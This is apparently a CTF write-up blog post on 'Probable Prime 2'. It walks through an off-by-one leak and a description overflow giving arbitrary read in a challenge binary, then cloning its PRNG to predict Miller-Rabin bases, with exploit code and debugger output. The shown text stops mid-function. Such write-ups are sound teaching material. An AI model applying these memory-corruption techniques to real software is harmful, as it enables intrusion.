@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Probable Prime 2 (WackAttack CTF 2025) | Zukane CTF</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Probable Prime 2 (WackAttack CTF 2025)" />
+<meta name="author" content="Zukane" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Challenge overview" />
+<meta property="og:description" content="Challenge overview" />
+<link rel="canonical" href="http://localhost:4000/probable-prime-2/" />
+<meta property="og:url" content="http://localhost:4000/probable-prime-2/" />
+<meta property="og:site_name" content="Zukane CTF" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-10-05T16:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Probable Prime 2 (WackAttack CTF 2025)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zukane"},"dateModified":"2025-10-05T16:00:00+02:00","datePublished":"2025-10-05T16:00:00+02:00","description":"Challenge overview","headline":"Probable Prime 2 (WackAttack CTF 2025)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/probable-prime-2/"},"url":"http://localhost:4000/probable-prime-2/"}</script>
+<!-- End Jekyll SEO tag -->
+
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Probable Prime 2 (WackAttack CTF 2025)</title>
+    <link rel="stylesheet" href="/assets/css/obsidian-theme.css">
+    <link rel="icon" type="image/png" href="/assets/images/favicon.png">
+    <meta name="google-site-verification" content="dyMwt_XPwaeGY1MubEtKTorF4C368AHqIwugUO8c6P8" />
+    <!-- MathJax configuration -->
+    <script>
+        window.MathJax = {
+          tex: {
+            packages: {'[+]': ['ams']},
+            inlineMath: [['$', '$'], ['\\(', '\\)']],
+            displayMath: [['$$', '$$'], ['\\[', '\\]']],
+            processEscapes: true,
+            tags: 'ams',
+            // Optional: Enable automatic equation numbering (if desired)
+            // equationNumbers: { autoNumber: "AMS" }
+          },
+          options: {
+            skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+          }
+        };
+      </script>
+      <script id="MathJax-script" async
+              src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+      </script>
+      
+  </head>
+  <body class="theme-dark">
+    <header>
+      <!-- Optionally, show a site title -->
+      <h1><a href="/", style="color: #ff5757;">Zukane CTF</a></h1>
+    </header>
+    <div class="container">
+      <!-- Display post title from front matter -->
+      
+        <h2 class="post-title">Probable Prime 2 (WackAttack CTF 2025)</h2>
+      
+      
+        <div class="post-tags">
+            
+            <a href="/tags/miller-rabin/" class="tag">Miller-Rabin</a>
+            
+            <a href="/tags/prng/" class="tag">PRNG</a>
+            
+            <a href="/tags/pwn/" class="tag">Pwn</a>
+            
+        </div>
+      
+
+      <!-- Main content -->
+      <h5 id="challenge-overview">Challenge overview</h5>
+
+<p>In this CTF challenge, we are given a Linux binary that acts as a simple database for prime numbers. The binary presents a menu with four options:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to the wack prime database
+Sadly we just lost all our primes, so we need help adding some new primes
+What do you want to do?
+1 Add a prime
+2 Edit a primename or description
+3 Showcase a prime
+4 Factor a prime
+&gt; 
+</code></pre></div></div>
+
+<p>The flag is revealed after successfully factoring one of the numbers stored in the database. The program checks if submitted numbers are prime, and the factoring function explicitly rejects trivial factors (1 and -1), making it impossible to factor a true prime. This immediately suggests that we must find a way to add a composite number that the binary’s primality test accepts as prime. This requires finding and exploiting flaws in both the binary’s memory safety and its cryptographic implementation.</p>
+
+<h5 id="reverse-engineering">Reverse engineering</h5>
+
+<p>The binary begins by calling the <code class="language-plaintext highlighter-rouge">init()</code> function:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">init</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span> <span class="o">*</span><span class="n">ctx</span><span class="p">){</span>
+  <span class="p">[...]</span>
+  <span class="n">__gmpz_init_set_str</span><span class="p">(</span><span class="n">local_c8</span><span class="p">,</span><span class="s">"6364136223846793005"</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
+  <span class="n">__gmp_randinit_lc_2exp</span><span class="p">(</span><span class="n">st</span><span class="p">,</span><span class="n">local_c8</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x400</span><span class="p">);</span>
+  <span class="n">__gmpz_init</span><span class="p">(</span><span class="n">k</span><span class="p">);</span>
+  <span class="p">[...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The function initializes an LCG using GMP’s <code class="language-plaintext highlighter-rouge">__gmp_randinit_lc_2exp</code> with parameters $A = 6364136223846793005, C = 1$ and a modulus of $2^{1024}-1$, which is stored in the global variable <code class="language-plaintext highlighter-rouge">st</code>. Afterwards, a 25-bit random integer $k$ is generated, as well as the 1024-bit state $X$</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">init</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span> <span class="o">*</span><span class="n">ctx</span><span class="p">){</span>
+  <span class="p">[...]</span>
+      <span class="n">__gmpz_init</span><span class="p">(</span><span class="n">X</span><span class="p">);</span>
+      <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x11</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">__gmpz_urandomb</span><span class="p">(</span><span class="n">X</span><span class="p">,</span><span class="n">st</span><span class="p">,</span><span class="mh">0x40</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="n">__gmpz_urandomb</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">st</span><span class="p">,</span><span class="mh">0x19</span><span class="p">);</span>
+  <span class="p">[...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The function <code class="language-plaintext highlighter-rouge">prime_checker()</code> implements a Miller-Rabin primality checker with 6 rounds. The random bases are generated using the <code class="language-plaintext highlighter-rouge">__gmpz_urandomm()</code> function. This means it generates a random number using the global RNG state <code class="language-plaintext highlighter-rouge">st</code> and the global integer <code class="language-plaintext highlighter-rouge">k</code> as an upper bound.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">prime_checker</span><span class="p">(</span><span class="kt">long</span> <span class="n">param_1</span><span class="p">){</span>
+	<span class="p">[...]</span>
+	<span class="n">__gmpz_urandomm</span><span class="p">(</span><span class="n">base</span><span class="p">,</span><span class="n">st</span><span class="p">,</span><span class="n">k</span><span class="p">);</span>
+	<span class="p">[...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Miller-Rabin primality checks are not completely reliable, as there exists <code class="language-plaintext highlighter-rouge">Strong Pseudoprimes</code> which are composite numbers that pass the Miller-Rabin primality test with respect to some bases. To get the flag, we could generate one such pseudoprime to bypass the <code class="language-plaintext highlighter-rouge">prime_checker()</code> function, and then factor it with our known factors. However, we must be able to predict the binary’s generated bases. To predict the generated bases, we must retrieve the values of $k$ and $X$ from the binary and copy the PRNG.</p>
+
+<h5 id="leaking-the-state">Leaking the state</h5>
+
+<p>When a new prime is added, the program reads the description using <code class="language-plaintext highlighter-rouge">fgets</code>, finds its length with <code class="language-plaintext highlighter-rouge">strlen</code>, and then manually appends a newline character. This logic is flawed:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span> <span class="o">*</span><span class="n">param_1</span><span class="p">){</span>
+	<span class="p">[...]</span>
+	<span class="n">__gmpz_set</span><span class="p">(</span><span class="n">auStack_978</span> <span class="o">+</span> <span class="n">local_b20</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">,</span><span class="n">local_b18</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Description: "</span><span class="p">);</span>
+	<span class="n">pcVar2</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">acStack_968</span> <span class="o">+</span> <span class="n">local_b20</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+	<span class="p">[...]</span>
+		<span class="n">sVar3</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">acStack_968</span> <span class="o">+</span> <span class="n">local_b20</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">);</span>
+		<span class="n">acStack_968</span><span class="p">[</span><span class="n">sVar3</span> <span class="o">+</span> <span class="n">local_b20</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\n'</span><span class="p">;</span>
+		<span class="n">local_b20</span> <span class="o">=</span> <span class="p">(</span><span class="n">local_b20</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x1e</span><span class="p">;</span>
+	<span class="p">[...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Here, <code class="language-plaintext highlighter-rouge">fgets</code> reads up to 58 bytes (57 character and a null-terminator). We can trigger the bug by providing a description that is exactly 57 characters long, with no trailing newline:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">fgets</code> reads our 57 characters and, seeing no newline, appends a null-terminator <code class="language-plaintext highlighter-rouge">\x00</code> at index 57.</li>
+  <li><code class="language-plaintext highlighter-rouge">strlen</code> is called on the buffer, and returns 57.</li>
+  <li>The program runs <code class="language-plaintext highlighter-rouge">description_buffer[57] = '\n'</code> which overwrites the null-terminator with a newline character.
+By using the “showcase prime” option in the menu on the corrupted entry, the program will call <code class="language-plaintext highlighter-rouge">printf("%s",...)</code> and continue to print data until it eventually finds a null-byte.</li>
+</ul>
+
+<p>The data located on the stack after the description buffer happens to be the array that stores pointers to the prime names. We can create a second prime entry without providing a name, so the program assigns it a default name by storing a pointer to a global variable <code class="language-plaintext highlighter-rouge">default_name</code>. This global <code class="language-plaintext highlighter-rouge">default_name</code> variable resides in the <code class="language-plaintext highlighter-rouge">.bss</code> section of the binary.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">create_prime</span><span class="p">(</span><span class="sa">b</span><span class="s">"leak"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"13"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">57</span><span class="p">)</span>
+<span class="n">create_prime</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="sa">b</span><span class="s">"11"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"asdf"</span><span class="p">)</span>
+<span class="n">prime</span><span class="p">,</span> <span class="n">desc</span> <span class="o">=</span> <span class="n">showcase_prime</span><span class="p">(</span><span class="sa">b</span><span class="s">"0"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">desc</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="p">,</span> <span class="sa">b</span><span class="s">""</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s">"Description: "</span><span class="p">,</span> <span class="sa">b</span><span class="s">""</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+<span class="n">bss_leak</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)))</span>
+</code></pre></div></div>
+
+<p>We can then leak the base address of the PIE executable:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">bss_leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x6150</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"PIE = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>With the base address, we can create an arbitrary write primitive. The prime entries consist of a name, a prime number, and an optional description:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">prime_ent</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">m_pName</span><span class="p">;</span>
+  <span class="n">__int64</span> <span class="n">_0x0004</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">prime</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">description</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>The description is stored in a 48 byte buffer. However, when editing the description of an existing prime, 58 bytes are read into the buffer:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span> <span class="o">*</span><span class="n">param_1</span><span class="p">){</span>
+	<span class="p">[...]</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Description: "</span><span class="p">);</span>
+    <span class="n">pcVar2</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">acStack_968</span> <span class="o">+</span> <span class="n">CONCAT44</span><span class="p">(</span><span class="n">uStack_b24</span><span class="p">,</span><span class="n">local_b28</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+	<span class="p">[...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>We can use this overflow to overwrite the name of an adjacent prime entry in the database. This gives us an arbitrary read, as we can send a payload of <code class="language-plaintext highlighter-rouge">b"A"*48 + p64(target_address)</code> to entry 0’s description, which overwrites entry 1’s name to <code class="language-plaintext highlighter-rouge">p64(target_address)</code>. When showcasing this entry later, the program calls <code class="language-plaintext highlighter-rouge">printf("%s", m_pName)</code>. Since <code class="language-plaintext highlighter-rouge">m_pName</code> now holds the target address we supplied, <code class="language-plaintext highlighter-rouge">printf</code> begins reading bytes from that location in memory and sends them back to us.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">leak_add</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
+    <span class="n">edit_description</span><span class="p">(</span><span class="sa">b</span><span class="s">"0"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">address</span><span class="p">))</span>
+    <span class="n">name_leak</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">showcase_prime</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">leaked_prefix</span> <span class="o">=</span> <span class="n">name_leak</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">leaked_prefix</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">9</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>We use this arbitrary read to leak the values of $k$ and $X$, which are contained within the object <code class="language-plaintext highlighter-rouge">st</code>. <code class="language-plaintext highlighter-rouge">st</code> is structured as follows:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; x/8gx &amp;st
+0x55f038d5d180 &lt;st&gt;:    0x0000000000000000      0x000055f0393152c0 &lt;- algdata pointer
+0x55f038d5d190 &lt;st+16&gt;: 0x0000000000000000      0x00007fa5f5e6bbe0
+0x55f038d5d1a0 &lt;k&gt;:     0x0000000100000001      0x000055f039315440 &lt;- k pointer
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; x/32gx 0x000055f0393152c0
+0x55f0393152c0: 0x0000001000000010      0x000055f039315300 # &lt;- X pointer
+0x55f0393152d0: 0x0000000100000001      0x000055f039315390
+0x55f0393152e0: 0x0000000000000001      0x0000000000000001
+0x55f0393152f0: 0x0000000000000400      0x0000000000000091 # &lt;- 0x400 = 1024 bit-size
+0x55f039315300: 0xecac3f17450b1e56      0xcfd2a64548f2e35c # &lt;- X is here
+0x55f039315310: 0x9ca3c08925695bcf      0xa7a71d64ebf073cb
+0x55f039315320: 0x88e98595174a6964      0x07a3f69c34ec83bc
+0x55f039315330: 0x416760bd066590af      0x4d5b571b50e6a95b
+0x55f039315340: 0xcdd12d48238d3608      0x8f9914b302e0967a
+0x55f039315350: 0xfb0302810f366862      0xfbb371fcae55b7b7
+0x55f039315360: 0x140c017107775d37      0x7d86f2f23316cc7f
+0x55f039315370: 0x17e984772c9c5dbd      0x50b9e2235dc0df41
+</code></pre></div></div>
+
+<p>So, we can retrieve the values of $k$ and $X$ from the binary:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">k_addr</span> <span class="o">=</span> <span class="n">leak_add</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">k</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">k</span> <span class="o">=</span> <span class="n">leak_add</span><span class="p">(</span><span class="n">k_addr</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"k = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">k</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">algdata_ptr</span> <span class="o">=</span> <span class="n">leak_add</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">st</span><span class="o">+</span><span class="mh">0x8</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"algdata_ptr  = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">algdata_ptr</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">x_ptr</span> <span class="o">=</span> <span class="n">algdata_ptr</span> <span class="o">+</span> <span class="mi">64</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"x_ptr  = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">x_ptr</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">chunks</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+    <span class="n">chunks</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">leak_add</span><span class="p">(</span><span class="n">x_ptr</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)))</span>
+
+<span class="n">Xbytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">chunks</span><span class="p">)</span>
+<span class="k">assert</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">Xbytes</span>
+<span class="n">X</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">Xbytes</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Leaked 1024-bit state X = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Since our leak relies on overwriting <code class="language-plaintext highlighter-rouge">\x00</code> with <code class="language-plaintext highlighter-rouge">\n</code>, any address or value we leak cannot contain <code class="language-plaintext highlighter-rouge">\x00</code>. Therefore, we must rerun the attack until the leaked values do not contain a null-byte.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PIE = 0x55f038d57000
+k = 0x46ed81
+algdata_ptr  = 0x55f0393152c0
+x_ptr  = 0x55f039315300
+Leaked 1024-bit state X = 0x50b9e2235dc0df4117e984772c9c5dbd7d86f2f23316cc7f140c017107775d37fbb371fcae55b7b7fb0302810f3668628f9914b302e0967acdd12d48238d36084d5b571b50e6a95b416760bd066590af07a3f69c34ec83bc88e98595174a6964a7a71d64ebf073cb9ca3c08925695bcfcfd2a64548f2e35cecac3f17450b1e56
+</code></pre></div></div>
+
+<h5 id="predicting-the-bases">Predicting the bases</h5>
+
+<p>With $k$ and $X$ leaked from the binary, we can recreate the PRNG locally to generate the 6 bases used in the Miller-Rabin primality check. We can recreate the <code class="language-plaintext highlighter-rouge">__gmp_randinit_lc_2exp</code> LCG locally, and, with some reverse-engineering and lucky prompts, recreate GMP’s <code class="language-plaintext highlighter-rouge">__gmpz_urandomm()</code> function:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">A</span> <span class="o">=</span> <span class="mh">0x5851f42d4c957f2d</span>
+<span class="n">C</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">MASK1024</span>  <span class="o">=</span> <span class="mi">2</span><span class="o">^</span><span class="mi">1024</span> <span class="o">-</span> <span class="mi">1</span>
+<span class="n">HALF_BITS</span> <span class="o">=</span> <span class="mi">512</span>
+<span class="n">HALF_MASK</span> <span class="o">=</span> <span class="mi">2</span><span class="o">^</span><span class="n">HALF_BITS</span> <span class="o">-</span> <span class="mi">1</span>
+
+<span class="k">class</span> <span class="nc">LCG1024</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">X</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">X</span> <span class="o">=</span> <span class="n">X</span> <span class="o">&amp;</span> <span class="n">MASK1024</span>
+
+    <span class="k">def</span> <span class="nf">step</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">X</span> <span class="o">=</span> <span class="p">(</span><span class="n">A</span> <span class="o">*</span> <span class="bp">self</span><span class="p">.</span><span class="n">X</span> <span class="o">+</span> <span class="n">C</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK1024</span>
+
+    <span class="k">def</span> <span class="nf">high512</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">step</span><span class="p">()</span>
+        <span class="k">return</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">X</span> <span class="o">&gt;&gt;</span> <span class="n">HALF_BITS</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">HALF_MASK</span>
+
+<span class="k">def</span> <span class="nf">_gmp_rand_bits</span><span class="p">(</span><span class="n">nbits</span><span class="p">,</span> <span class="n">rng</span><span class="p">):</span>
+    <span class="n">chunk</span> <span class="o">=</span> <span class="n">rng</span><span class="p">.</span><span class="n">high512</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">nbits</span> <span class="o">&lt;=</span> <span class="n">HALF_BITS</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">chunk</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">nbits</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">got</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="n">got</span> <span class="o">&lt;</span> <span class="n">nbits</span><span class="p">:</span>
+        <span class="n">take</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">HALF_BITS</span><span class="p">,</span> <span class="n">nbits</span> <span class="o">-</span> <span class="n">got</span><span class="p">)</span>
+        <span class="n">out</span> <span class="o">|=</span> <span class="p">(</span><span class="n">chunk</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">take</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="n">got</span>
+        <span class="n">got</span> <span class="o">+=</span> <span class="n">take</span>
+        <span class="k">if</span> <span class="n">got</span> <span class="o">&lt;</span> <span class="n">nbits</span><span class="p">:</span>
+            <span class="n">chunk</span> <span class="o">=</span> <span class="n">rng</span><span class="p">.</span><span class="n">high512</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">out</span>
+
+<span class="k">def</span> <span class="nf">urandomm_mod</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">rng</span><span class="p">):</span>
+    <span class="n">size</span> <span class="o">=</span> <span class="p">(</span><span class="n">n</span><span class="p">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">63</span><span class="p">)</span> <span class="o">//</span> <span class="mi">64</span>
+    <span class="n">nh</span> <span class="o">=</span> <span class="p">(</span><span class="n">n</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">64</span><span class="o">*</span><span class="p">(</span><span class="n">size</span><span class="o">-</span><span class="mi">1</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">64</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">clz</span> <span class="o">=</span> <span class="p">(</span><span class="mi">64</span> <span class="o">-</span> <span class="n">nh</span><span class="p">.</span><span class="n">bit_length</span><span class="p">())</span> <span class="k">if</span> <span class="n">nh</span> <span class="o">!=</span> <span class="mi">0</span> <span class="k">else</span> <span class="mi">64</span>
+    <span class="n">pow2</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">if</span> <span class="p">(</span><span class="n">nh</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">nh</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="p">(</span><span class="n">size</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">or</span> <span class="p">(</span><span class="n">n</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">64</span><span class="o">*</span><span class="p">(</span><span class="n">size</span><span class="o">-</span><span class="mi">1</span><span class="p">)))</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="k">else</span> <span class="mi">0</span>
+    <span class="n">nbits</span> <span class="o">=</span> <span class="n">size</span><span class="o">*</span><span class="mi">64</span> <span class="o">-</span> <span class="n">clz</span> <span class="o">-</span> <span class="n">pow2</span>
+    <span class="k">if</span> <span class="n">nbits</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">_gmp_rand_bits</span><span class="p">(</span><span class="n">nbits</span><span class="p">,</span> <span class="n">rng</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">r</span>
+</code></pre></div></div>
+
+<p>We then  predict the 6 bases with $k$ and $X$:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">predict_bases</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">X</span><span class="p">,</span> <span class="n">rounds</span><span class="o">=</span><span class="mi">6</span><span class="p">):</span>
+    <span class="n">rng</span> <span class="o">=</span> <span class="n">LCG1024</span><span class="p">(</span><span class="n">X</span><span class="p">)</span>
